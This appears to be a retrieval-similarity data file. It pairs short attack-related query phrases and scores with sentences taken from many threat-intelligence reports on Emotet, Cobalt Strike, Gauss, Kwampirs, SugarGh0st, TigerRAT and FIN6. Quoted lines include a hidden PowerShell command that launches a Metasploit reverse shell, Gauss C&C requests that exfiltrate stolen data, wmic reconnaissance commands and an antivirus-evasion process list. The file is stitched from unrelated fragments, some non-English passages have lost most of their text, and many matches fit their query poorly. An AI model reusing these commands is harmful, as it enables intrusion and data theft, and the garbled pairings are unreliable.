CnC Server group 2 ET CNC Feodo Tracker Reported CnC Server group 20 ET CNC Feodo Tracker Reported CnC Server group 21 ET CNC Feodo Tracker Reported CnC Server group 23 ET CNC Feodo Tracker Reported CnC Server group 24 ET CNC Feodo Tracker Reported CnC Server group 25 ET CNC Feodo Tracker Reported CnC Server group 3 ET CNC Feodo Tracker Reported CnC Server group 4 ET CNC Feodo Tracker Reported CnC Server group 5 ET CNC Feodo Tracker Reported CnC Server group 6 ET CNC Feodo Tracker Reported CnC Server group 7 ET CNC Feodo Tracker Reported CnC Server group 8 ET CNC Feodo Tracker Reported CnC Server group 9ET MALWARE W32/Emotet CnC Beacon 3SigmaYarahttps://github.com/The-DFIR-Report/Yara-Rules/blob/main/15184/15184.yarMITREPowerShell T1059.001Process Injection T1055File Deletion T1070.004Lateral Tool Transfer T1570Valid Accounts T1078Service Execution T1569.002SMB/Windows Admin Shares T1021.002Remote System Discovery T1018Process Discovery T1057Rundll32 T1218.011Regsvr32 T1218.010Domain Account T1087.002Domain Groups T1069.002System Information Discovery T1082Data Encrypted for Impact T1486Network Share Discovery T1135Data from Network Shared Drive T1039Web Protocols T1071.001Remote Access Software T1219Exfiltration to Cloud Storage T1567.002Remote Desktop Protocol T1021.001Malicious File T1204.002Spearphishing Attachment T1566.001Exploitation of Remote Services T1210Internal case #15184Related']
they also used tasklist|0.7872011904900574|['Nomadic Octopus Paperbug CampaignTLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glossary 3 2 Introduction 3 3 ExecutiveSummary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']
Next, they proceeded to transfer a beacon executable over SMB to the remote host’s ProgramData directory.|0.9253619566931467|['These commands would go on to be repeated daily by the Emotet process.', 'Around one and one-half hours after execution, Emotet began sending spam emails, mailing new malicious attachments to continue spreading.Similar activity continued over the second day, but on the third day of the incident, Emotet dropped a Cobalt Strike executable beacon onto the beachhead host.', 'Using the Cobalt Strike beacon, the threat actors began conducting a new round of discovery activity.', 'Windows net commands were run, targeting domain groups and computers, nltest was executed again, and they also used tasklist and ping to investigate a remote host.The threat actor then moved laterally to a workstation.', 'They first attempted this action using a PowerShell beacon and a remote service on the host, but while the script did execute on the remote host, it appeared to fail to connect to the command and control server.', 'Next, they proceeded to transfer a beacon executable over SMB to the remote hosts ProgramData directory.', 'This beacon was then successfully executed via WMI and connected successfully to the threat actors server.Once on this new host the threat actors proceeded to run the net commands to review the Domain Administrators group again.', 'They then proceeded to dump credentials from the LSASS process on the host.', 'With some further process injection they then began to enumerate SMB shares across the environment and on finding a primary file server reviewed several documents present on the server.', 'This Cobalt Strike server stopped communicating shortly there after.On the fourth day of the intrusion, Emotet dropped a new Cobalt Strike beacon.', 'Again, some net command discovery was run for domain admins and domain controller servers.']
wmic|0.773524739341554|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
wmic|0.8601303879519202|[]
wmic|0.8836392615299994|['This module executes a series of commands to gather additional host information, which is subsequently uploaded to a C2 server.', 'Interestingly, the commands are not identical to the analogous module examined in the initial Symantec report.', 'These commands executed by this module are almost all wmic commands and are used to retrieve extensive information related to the computer, drivers, IRQs, baseboard, partitions, bios, logon, logical disks - a complete radiography of the system, displayed at Snippet 9.', 'Figure 29: Kwampirs making use of proxy and proxy bypass configuration arrays with an iterator (v2).', 'Shamoon 1, 2 and 3 and Kwampirs, all contain arrays for C2, and Proxy, ProxyByPass, and accessType information.', 'INDEX cylera.com24 ANALYSIS SECTIONS The linkage between Kwampirs and Shamoon hostname getmac ver arp -a systeminfo wmic nic get caption,AdapterType,Manufacturer wmic timezone get caption wmic IRQ get caption, IRQNumber wmic port get StartingAddress, EndingAddress wmic csproduct wmic computerSystem wmic baseboard wmic cpu wmic partition wmic bios wmic startup wmic netlogin wmic portconnector wmic memphysical wmic share wmic logon wmic OS wmic logicaldisk get caption,description,size,providername wmic desktop Snippet 9: Kwampirs commands found in a module downloaded by the reporter.', 'Considering the level of detail found in the information gathered, it seems likely that the use of this module is intended for a reconnaissance phase.', 'The types of information gathered may imply that the physical attributes of the device are of interest.', 'This may imply that the ultimate goal of the campaign only relates to devices that satisfy particular physical properties that can be inferred from this information.', 'INDEX cylera.com25 ANALYSIS SECTIONS The linkage between Kwampirs and Shamoon 5.1.5 Artifact Similarities File Metadata The metadata of the dropper and reporter components (DLL and EXE) are based on metadata taken from legitimate Microsoft files in both Kwampirs and Shamoon (Figures 30, 31, 32 and 33), but in the case of Kwampirs, metadata from other files/companies was also used in later campaigns.', 'Kwampirs Dropper Shamoon Dropper Figure 30: Kwampirs dropper metadata Figure 31: Shamoon dropper metadata INDEX cylera.com26 ANALYSIS SECTIONS The linkage between Kwampirs and Shamoon Kwampirs Reporter Shamoon Reporter Figure 32: Kwampirs reporter metadata Figure 33: Kwampirs reporter metadata It is worth noting that the metadata of later Kwampirs samples looks different and contains many different tools.']
and a batch file 1.bat were dropped on the host and the batch file was executed|0.770161904706058|"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecommunications.', '4.', 'Sandman (China) - Sandman APT is likely associated with suspected China-based threat clusters known to use the KEYPLUG backdoor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-0866/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's toolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing collective efforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many commodity loaders were poly- morphic (change their hash on every execution) and supported attackers' hands-on-keyboard activities for information gathering, disabling security settings, and forging the way for ransomware attacks.""]"
cmd.exe /c start|0.7858513750488658|"['The following is a knowledge base of SQL queries, based on the Adversary Tactics, Techniques, and Common Knowledge (ATT&CK) adversary model, developed by MITRE.', 'These SQL queries are based on MITREs recommended analytics, and are meant to further assist the SOC analyst in their threat hunt for a potential breach on their network.15 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe called from Command Shell Tactic: TTP MITRE Reference: CAR-2013-03-001: Reg.exe called from Command Shell Hypothesis: Registry modifications are often essential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphically via select source.name, data.process.cmd, count(*) AS regedit.exe or by using the corresponding channels, or even hostcount from network-events where type = 'sysmon' calling the Registry APIs directly."", ""The built-in utility reg.exe AND data.process.action = 'launch' AND data.process."", ""provides a command-line interface to the registry, so that image.file = 'reg.exe' AND data.process.parentImage.file = queries and modifications can be performed from a shell, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe will likely be explorer.exe.', ""Occasionally, (data.process.cmd LIKE '%add%' OR data.process.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.process.cmd LIKE '%copy%' OR data."", 'behavior as well, but likely from a different process tree.', ""process.cmd LIKE '%restore%' OR data.process.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.process.cmd LIKE '%import%') order by tuned out accordingly."", 'hostcount DESC16 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
cmd.exe /c start|0.7858513750488658|"[', ,     APT28.', ', ,       - .', ', -    .', ',      .', ': OCEANMAP - ,   C#.', 'cmd.exe.', 'IMAP.', ', base64- ,   (""Drafts"")   ;   , \'  .', '(""INBOX"").', '( ,    ),     .', "".URL- 'VMSearch.url'  .""]"
cmd.exe /c start|0.7858513750488658|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
They then proceeded to dump credentials from the LSASS process on the host.|1.0|['Using the Cobalt Strike beacon, the threat actors began conducting a new round of discovery activity.', 'Windows net commands were run, targeting domain groups and computers, nltest was executed again, and they also used tasklist and ping to investigate a remote host.The threat actor then moved laterally to a workstation.', 'They first attempted this action using a PowerShell beacon and a remote service on the host, but while the script did execute on the remote host, it appeared to fail to connect to the command and control server.', 'Next, they proceeded to transfer a beacon executable over SMB to the remote hosts ProgramData directory.', 'This beacon was then successfully executed via WMI and connected successfully to the threat actors server.Once on this new host the threat actors proceeded to run the net commands to review the Domain Administrators group again.', 'They then proceeded to dump credentials from the LSASS process on the host.', 'With some further process injection they then began to enumerate SMB shares across the environment and on finding a primary file server reviewed several documents present on the server.', 'This Cobalt Strike server stopped communicating shortly there after.On the fourth day of the intrusion, Emotet dropped a new Cobalt Strike beacon.', 'Again, some net command discovery was run for domain admins and domain controller servers.', 'A flight of netlogon authentications were observed from the beachhead host to the domain controller as a possible attempt at exploiting the domain controller.The threat actors, however, proceeded along a more traditional path, using SMB file transfers and remote services to move laterally across domain controllers and several other servers in the environment using Cobalt Strike beacon DLLs.', 'On the domain controller, the threat actors conducted further discovery tasks runningfind.batandp.bat, which executed AdFind active directory discovery and performed a ping sweep across the environment.On one of the other targeted servers, the threat actors deployed Tactical RMM, a remote management agent, for additional access and persistence in the environment.']
service was installed in the system|1.0|['Throughout the compromise, SQUIDGATE was used to execute PowerShell commands to launch a Metasploit reverse-shell (Fig.', '13).', 'SQUIDGATE is a malware family sold by an actor operating in a reputable, Russian-language forum.', 'The attacker moved Figure 13. across the environment using Metasploit and privileged credentials obtained Truncated event earlier in the intrusion.', 'Our tracking of the malware service provider and resultant log associated campaigns enabled us to attribute this operation to FIN6-motivated intrusions with execution throughout 2020. of MetaSploit reverse shell.', 'A service was installed in the system.', 'Service Name: WAkUwdQtTYCHqlHw Service File Name: %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq 4){$b=&amp;apos;powershell.exe&amp;apos;} else{$b=$env:windir+&amp;apos;\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.', 'exe&amp;apos;};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.', 'FileName=$b;$s.Arguments=&amp;apos;-nop -w hidden -e JABzAD0ATgBlA<TRUNCATED FOR BREVITY>BvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApAD- sA&amp;apos;;$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.', 'WindowStyle=&amp;apos;Hidden&amp;apos;;$s.CreateNoWindow=$true;$p=[System.', 'Diagnostics.Process]::Start($s); Service Type: user mode service Start Type: demand start Service Account: LocalSystem From a POS server, the attacker deployed SCRAPMINT POS malware, a tool that identifies Track 1 and Track 2 payment card information in memory and writes it to a file.']
delete the driver files.|0.7575354639945083|"['Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""', ""The authors have also created skeleton code in preparation for implementing video capture from Web cameras, though it hasn't been implemented yet."", 'USB Dump The USB Dump capability gives the attackers the ability to: 7/12Enumerate files for path ""LOCAL_APPDATA\\\\GDIFONTC"".', 'Delete files.']"
whoami /groups|0.8688756151045635|['Nomadic Octopus Paperbug CampaignTLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glossary 3 2 Introduction 3 3 ExecutiveSummary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']
the configuration file encrypted.|0.8352336949182017|['It writes itself in files: and modifies the %system32%\\\\wbem\\\\wmiqry32.dll, %system32%\\\\wbem\\\\wmihlp32.dll system registry to be loaded instead of file.', '%system32%\\\\wbem\\\\wbemsvc.dll To achieve this, it writes the following registry value: [HKCR\\\\CLSID\\\\{7C857801-7381-11CF-884D-00AA004B2E24}\\\\InProcServer32] Default = %system32%\\\\wbem\\\\wmihlp32.dll Operation The module is automatically loaded into processes that use wbemsvc.dll.', 'When loaded in svchost.exe that was started with -k netsvc parameter, it starts its main thread.', 'The module creates ShellHWStop, Global\\\\ShellHWDetectionEvent events, mutex ShellHWDetectionMutex.', '12The main thread exits if the following processes were found at its start: LMon.exe sagui.exe RDTask.exe kpf4gui.exe ALsvc.exe pxagent.exe fsma32.exe licwiz.exe SavService.exe prevxcsi.exe alertwall.exe livehelp.exe SAVAdminService.exe csi-eui.exe mpf.exe lookout.exe savprogress.exe lpfw.exe mpfcm.exe emlproui.exe savmain.exe outpost.exe fameh32.exe emlproxy.exe savcleanup.exe filemon.exe AntiHook.exe endtaskpro.exe savcli.exe procmon.exe xfilter.exe netguardlite.exe backgroundscanclient.exe Sniffer.exe scfservice.exe oasclnt.exe sdcservice.exe acs.exe scfmanager.exe omnitray.exe sdcdevconx.exe aupdrun.exe spywareterminatorshield.exe onlinent.exe sdcdevconIA.exe sppfw.exe spywat~1.exe opf.exe sdcdevcon.exe spfirewallsvc.exe ssupdate.exe pctavsvc.exe configuresav.exe fwsrv.exe terminet.exe pctav.exe alupdate.exe opfsvc.exe tscutynt.exe pcviper.exe InstLsp.exe uwcdsvr.exe umxtray.exe persfw.exe CMain.exe dfw.exe updclient.exe pgaccount.exe CavAUD.exe ipatrol.exe webwall.exe privatefirewall3.exe CavEmSrv.exe pcipprev.exe winroute.exe protect.exe Cavmr.exe prifw.exe apvxdwin.exe rtt_crc_service.exe Cavvl.exe tzpfw.exe as3pf.exe schedulerdaemon.exe CavApp.exe privatefirewall3.exe avas.exe sdtrayapp.exe CavCons.exe pfft.exe avcom.exe siteadv.exe CavMud.exe armorwall.exe avkproxy.exe sndsrvc.exe CavUMAS.exe app_firewall.exe avkservice.exe snsmcon.exe UUpd.exe blackd.exe avktray.exe snsupd.exe cavasm.exe blackice.exe avkwctrl.exe procguard.exe CavSub.exe umxagent.exe avmgma.exe DCSUserProt.exe CavUserUpd.exe kpf4ss.exe avtask.exe avkwctl.exe CavQ.exe tppfdmn.exe aws.exe firewall.exe Cavoar.exe blinksvc.exe bgctl.exe THGuard.exe CEmRep.exe sp_rsser.exe bgnt.exe spybotsd.exe OnAccessInstaller.exe op_mon.exe bootsafe.exe xauth_service.exe SoftAct.exe cmdagent.exe bullguard.exe xfilter.exe CavSn.exe VCATCH.EXE cdas2.exe zlh.exe Packetizer.exe SpyHunter3.exe cmgrdian.exe adoronsfirewall.exe Packetyzer.exe wwasher.exe configmgr.exe scfservice.exe zanda.exe authfw.exe cpd.exe scfmanager.exe zerospywarele.exe dvpapi.exe espwatch.exe dltray.exe 13zerospywarelite_installer.exe clamd.exe fgui.exe dlservice.exe Wireshark.exe sab_wab.exe filedeleter.exe ashwebsv.exe tshark.exe SUPERAntiSpyware.exe firewall.exe ashdisp.exe rawshark.exe vdtask.exe firewall2004.exe ashmaisv.exe Ethereal.exe asr.exe firewallgui.exe ashserv.exe Tethereal.exe NetguardLite.exe gateway.exe aswupdsv.exe Windump.exe nstzerospywarelite.exe hpf_.exe avastui.exe Tcpdump.exe cdinstx.exe iface.exe avastsvc.exe Netcap.exe cdas17.exe invent.exe Netmon.exe fsrt.exe ipcserver.exe CV.exe VSDesktop.exe ipctray.exe The module reads the registry value SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Reliability TimeStampForUI.', 'It is an encrypted configuration file.', 'The configuration file contains the list of additional modules, their names, DLL exports names to call and location of the modules additional files.', 'Gauss ShellNotifyUser ShellNotifyUserEx SetWindowEvent InitShellEx %systemroot%\\\\system32\\\\winshell.ocx %temp%\\\\ws1bin.dat Godel InitCache RevertCache ValidateEntry CreateEntry %windir%\\\\system32\\\\dskapi.ocx %temp%\\\\~gdl.tmp UsbDir InitCache RevertCache ValidateEntry CreateEntry %windir%\\\\system32\\\\smdk.ocx %temp%\\\\~mdk.tmp String values from config file (example) 14Every module is loaded and its export functions are called as specified in the configuration.', 'Most of the actions are logged in an encrypted (with XOR) file %temp%\\\\~shw.tmp.', 'Sample of decrypted ~shw.tmp After loading additional modules, it tries to acquire the same privileges as explorer.exe and then starts its C&C interaction loop.', 'Prior to communicating with the C&C, all the information from the other modules log files is copied to the ~shw.tmp file.']
the configuration file encrypted.|0.8352336949182017|['It is possible that during initial infection, only the ShellHW component is installed, which then installs the other modules.ShellHW (file name wmiqry32.dll/wmihlp32.dll) is the main component of the malware which ensures that all other Gauss modules are loaded when the malware starts and operate correctly.Comparison with FlameAs we mentioned above, there are significant similarities in code and architecture between Gauss and Flame.', 'In fact, it is largely due to these similarities that Gauss was discovered.', 'We created the following table for a clearer understanding of these facts and proof of kinship between the two attack platforms:FeatureFlameGaussModular architectureYesYesUsing kernel driversNoNo.OCX files extensionsYesYesConfiguration settingsPredefined in main bodyStored in registryDLL injectionsYesYesVisual C++YesYesEncryption methodsXORXORUsing USB as storageYes (hub001.dat)Yes (.thumbs.db)Embedded LUA scriptingYesNoBrowser history/cookies stealerYes (soapr32/nteps32)Yes (winshell)CVE2010-2568 (.LNK exploit)Yes (target.lnk)Yes (target.lnk)C&C communicationhttpshttpsLog files/stolen data stored in %temp%YesYesZlib compression of collected dataYesYesIn addition to the features listed above, there are considerable similarities in the operation of the Flame and Gauss C&C servers.', 'The relevant analysis is provided in the C&C Communication section.There are more similarities in the code and data of the modules:Wmiqry32/Wmihlp32.dll aka ShellHWInstalled by: Unknown dropperOperates in two modes: installation and normal operation.File names%system32%wbemwmiqry32.dll%system32%wbemwmihlp32.dllSome known MD5C3B8AD4ECA93114947C777B19D3C605908D7DDB11E16B86544E0C3E677A60E10055AE6B8070DF0B3521D78E1B8D2FCE4FA54A8D31E1434539FBB9A412F4D32FF01567CA73862056304BB87CBF797B89923D956C297C67D94F591FCB574D9325FImage Size258 048 bytesNumber of resources7Resources121, 131, 141, 151, 161, 171, 181Date of compilationJun 1 2011Jul 16 2011Jul 18 2011Sep 28 2011Oct 20 2011Related files%temp%~shw.tmp%temp%~stm.tmpInstallationThe module checks if it was loaded by lsass.exe process and, if true, proceeds with the installation.It writes itself in files: %system32%wbemwmiqry32.dll, %system32%wbemwmihlp32.dll and modifies the system registry to be loaded instead of %system32%wbemwbemsvc.dll file.To achieve this, it writes the following registry value:[HKCRCLSID{7C857801-7381-11CF-884D-00AA004B2E24}InProcServer32] Default = %system32%wbemwmihlp32.dllOperationThe module is automatically loaded into processes that use wbemsvc.dll.', 'When loaded in svchost.exe that was started with -k netsvc parameter, it starts its main thread.The module creates ShellHWStop, GlobalShellHWDetectionEvent events, mutex ShellHWDetectionMutex.The main thread exits if the following processes were found at its start:LMon.exesagui.exeRDTask.exekpf4gui.exeALsvc.exepxagent.exefsma32.exelicwiz.exeSavService.exeprevxcsi.exealertwall.exelivehelp.exeSAVAdminService.execsi-eui.exempf.exelookout.exesavprogress.exelpfw.exempfcm.exeemlproui.exesavmain.exeoutpost.exefameh32.exeemlproxy.exesavcleanup.exefilemon.exeAntiHook.exeendtaskpro.exesavcli.exeprocmon.exexfilter.exenetguardlite.exebackgroundscanclient.exeSniffer.exescfservice.exeoasclnt.exesdcservice.exeacs.exescfmanager.exeomnitray.exesdcdevconx.exeaupdrun.exespywareterminatorshield.exeonlinent.exesdcdevconIA.exesppfw.exespywat~1.exeopf.exesdcdevcon.exespfirewallsvc.exessupdate.exepctavsvc.execonfiguresav.exefwsrv.exeterminet.exepctav.exealupdate.exeopfsvc.exetscutynt.exepcviper.exeInstLsp.exeuwcdsvr.exeumxtray.exepersfw.exeCMain.exedfw.exeupdclient.exepgaccount.exeCavAUD.exeipatrol.exewebwall.exeprivatefirewall3.exeCavEmSrv.exepcipprev.exewinroute.exeprotect.exeCavmr.exeprifw.exeapvxdwin.exertt_crc_service.exeCavvl.exetzpfw.exeas3pf.exeschedulerdaemon.exeCavApp.exeprivatefirewall3.exeavas.exesdtrayapp.exeCavCons.exepfft.exeavcom.exesiteadv.exeCavMud.exearmorwall.exeavkproxy.exesndsrvc.exeCavUMAS.exeapp_firewall.exeavkservice.exesnsmcon.exeUUpd.exeblackd.exeavktray.exesnsupd.execavasm.exeblackice.exeavkwctrl.exeprocguard.exeCavSub.exeumxagent.exeavmgma.exeDCSUserProt.exeCavUserUpd.exekpf4ss.exeavtask.exeavkwctl.exeCavQ.exetppfdmn.exeaws.exefirewall.exeCavoar.exeblinksvc.exebgctl.exeTHGuard.exeCEmRep.exesp_rsser.exebgnt.exespybotsd.exeOnAccessInstaller.exeop_mon.exebootsafe.exexauth_service.exeSoftAct.execmdagent.exebullguard.exexfilter.exeCavSn.exeVCATCH.EXEcdas2.exezlh.exePacketizer.exeSpyHunter3.execmgrdian.exeadoronsfirewall.exePacketyzer.exewwasher.execonfigmgr.exescfservice.exezanda.exeauthfw.execpd.exescfmanager.exezerospywarele.exedvpapi.exeespwatch.exedltray.exezerospywarelite_installer.execlamd.exefgui.exedlservice.exeWireshark.exesab_wab.exefiledeleter.exeashwebsv.exetshark.exeSUPERAntiSpyware.exefirewall.exeashdisp.exerawshark.exevdtask.exefirewall2004.exeashmaisv.exeEthereal.exeasr.exefirewallgui.exeashserv.exeTethereal.exeNetguardLite.exegateway.exeaswupdsv.exeWindump.exenstzerospywarelite.exehpf_.exeavastui.exeTcpdump.execdinstx.exeiface.exeavastsvc.exeNetcap.execdas17.exeinvent.exeNetmon.exefsrt.exeipcserver.exeCV.exeVSDesktop.exeipctray.exeThe module reads the registry value SOFTWAREMicrosoftWindowsCurrentVersionReliability TimeStampForUI.', 'It is an encrypted configuration file.', 'The configuration file contains the list of additional modules, their names, DLL exports names to call and location of the modules additional files.String values from config file (example)GaussShellNotifyUser ShellNotifyUserEx SetWindowEvent InitShellEx %systemroot%system32winshell.ocx %temp%ws1bin.datGodelInitCache RevertCache ValidateEntry CreateEntry %windir%system32dskapi.ocx %temp%~gdl.tmpUsbDirInitCache RevertCache ValidateEntry CreateEntry %windir%system32smdk.ocx %temp%~mdk.tmpEvery module is loaded and its export functions are called as specified in the configuration.Most of the actions are logged in an encrypted (with XOR) file %temp%~shw.tmp.Sample of decrypted ~shw.tmpAfter loading additional modules, it tries to acquire the same privileges as explorer.exe and then starts its C&C interaction loop.Prior to communicating with the C&C, all the information from the other modules log files is copied to the ~shw.tmp file.', 'Paths to the log files are taken from the TimeStampForUI configuration file.As a result, at this stage ~shw.tmp becomes a universal container file containing all the stolen data.It checks Internet connection (https) by accessing URLs specified in its resource 161.It then checks an https connection with www.google.com or www.update.windows.com.', 'If 200 OK is received in reply, it sends a request with the proxy server parameters taken from the prefs.js file of the Mozilla Firefox browser.When an Internet connection is available, it connects to its C&C servers that are specified in resource 131:Connection is established using WinInet API and is performed in two stages:GET request to the server.', 'The response from the server is expected to contain new modules, commands or configuration data.GET[C&amp;Cdomain]/userhome.php?sid=[randomstring]==&amp;uid=VfHx8fHx8fHx8fHx8fHx8fHx8fE=POST request to the server with the contents of the file ~shw.tmp that contains all data collected from the infected computer.The response from the server is decrypted using XOR and 0xACDC as the key.', 'Exfiltrated data is compressed with Zlib.The C&C connection routine is controlled by a DWORD value that is read from the registry value:[HKLMSOFTWAREMicrosoftWindowsCurrentVersionReliability]ShutdownIntervalSnapshotUIThe initial value of the counter is read from resource 181 and is equal to 56.']
The batch script|0.8423811643090838|['After that, the dropped JavaScript is executed using the living-off-the-land binary (LoLBin) cscript.', 'Sample of malicious LNK file.', 'JavaScript dropper The JavaScript dropper is a heavily obfuscated script embedded with base64 encoded data of the other components of the attack.', 'The JavaScript decodes and drops the embedded files into the %TEMP% folder, including a batch script, a customized DLL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundll32 executable from the Windows\\\\SysWow64 folder into the %TEMP% folder.', 'Finally, it executes the batch script loader from the %TEMP% location and runs the customized DLL loader.', 'The JavaScript deleted itself from the file system afterward.', '5/16The JavaScript dropper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the commands to run the dropped customized DLL loader.', 'When executed, it sideloads the DLL loader with rundll32.exe and executes the function which is DllUnregisterServer, typically used by COM (Component Object Model) DLLs.', 'The batch script loader.']
The batch script|0.8423811643090838|['After that, the dropped JavaScript is executed using the living-off-the-land binary (LoLBin) cscript.', 'https://blog.talosintelligence.com/new-sugargh0st-rat/ 5/191/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea Sample of malicious LNK file.', 'JavaScript dropper The JavaScript dropper is a heavily obfuscated script embedded with base64 encoded data of the other components of the attack.', 'The JavaScript decodes and drops the embedded files into the %TEMP% folder, including a batch script, a customized DLL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundll32 executable from the Windows\\\\SysWow64 folder into the %TEMP% folder.', 'Finally, it executes the batch script loader from the %TEMP% location and runs the customized DLL loader.', 'The JavaScript deleted itself from the file system afterward.', 'https://blog.talosintelligence.com/new-sugargh0st-rat/ 6/191/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea The JavaScript dropper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the commands to run the dropped customized DLL loader.', 'When executed, it sideloads the DLL loader with rundll32.exe and executes the function which is DllUnregisterServer, typically used by COM (Component Object Model) DLLs.', 'The batch script loader.']
Disables Windows Defender Attack Surface Reduction (ASR) rules|0.77516556995825|['Carry out regular monitoring of the access logs so that activities of unauthorized or suspicious nature may be detected.', 'Ensure following of the industry standards and regulations like GDPR, HIPAA, FERPA, etc., for compliance to geographical location and nature of data handled by third-party vendors.', 'If you are a third-party, ensure that data privacy compliance requirements are understood and adhered to.2024 Public Sector Threat Landcape: Trustwave Threat Intelligence Briefing and Mitigation Strategies 88 Initial Payload & Expansion / Pivoting ACTIONABLE MITIGATION RECOMMENDATIONS: Educate users about the dangers of opening unknown files and links.', 'Regularly conduct security awareness training to help them identify and avoid phishing attempts and social engineering tactics.', 'Implement policies to restrict or monitor the execution of scripts like VBA and Powershell using tools like Windows Group Policy.', 'Microsoft also has attack surface reduction (ASR) rules.', 'Use advanced email filtering solutions like Trustwave MailMarshal to detect and block malicious emails that may contain harmful attachments or links.', 'Employ comprehensive endpoint protection solutions that include antivirus, anti- malware, and behavior-based threat detection to identify and mitigate threats.', 'Conduct regular audits of all applications operating within the environment.', 'Implement highly granular allow lists of applications on specific hosts to minimize exposure.', 'Prevent malicious actors from deploying applications that masquerade as known apps to execute malicious commands.']
keylogging|0.8650775050655931|"['Require encryption for employees, especially employees working remotely.', 'This includes whole-disc, such as 256- bit AES, and network encryption via SSL or TLS.', 'For enterprises, Recorded Future can monitor for potential typosquat domains weaponized in phishing attacks.', 'This includes not only the domains belonging to one organization, but third-party partners and vendors with enterprise network access.', 'www.recordedfuture.com | Recorded Future CTA-2022-0802 6CYBER THREAT ANALYSIS The Recorded Future Platform can also assist with Through the use of process monitoring, monitor for the the detection of compromised credential information execution and command of binaries involved in data linked to valid accounts to assist in providing context destruction activity, such as vssadmin, wbadmin, and surrounding suspicious user behavior that may include bcdedit.', 'keylogging activity.', 'Recorded Future Platform users can Monitor for the creation of suspicious file modification continue to monitor underground sources to identify the activity, particularly large quantities of file modifications spyware and keylogging tools that are likely to be the in user directories.', 'most harmful to their immediate infrastructure or supply Consider keeping sensitive client information on systems chain.', 'disconnected from the internet or segmented from the rest of the corporate network.', 'Since ransomware will Ransomware encrypt all files on a victim system and often will search Maintain offline backups of your organizations data and for directories on the network (such as networked file ensure that these backups stay up to date to prevent data loss shares) to also encrypt, moving highly sensitive customer in the event of a ransomware infection.', 'Additionally, Recorded data to a system with no internet access or access to the Future recommends the following mitigations to reduce overall rest of the network will minimize the access ransomware risk: would have to those files.']"
keylogging|1.0|"['This implant consists of several RAT capabilities, ranging from arbitrary command execution to file management.', 'Capabilities of the implant include: Gather system information: username, computer name, network interface info, system info including product and version.', 'Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe 6/12Implant capability to run arbitrary commands.', 'Screen capture.', 'Socks tunneling.', 'Keylogging.', 'File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes, Self delete/uninstall from system.', 'The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon.', 'One of these capabilities is called ""USB dump.""', ""The authors have also created skeleton code in preparation for implementing video capture from Web cameras, though it hasn't been implemented yet."", 'USB Dump The USB Dump capability gives the attackers the ability to: 7/12Enumerate files for path ""LOCAL_APPDATA\\\\GDIFONTC"".']"
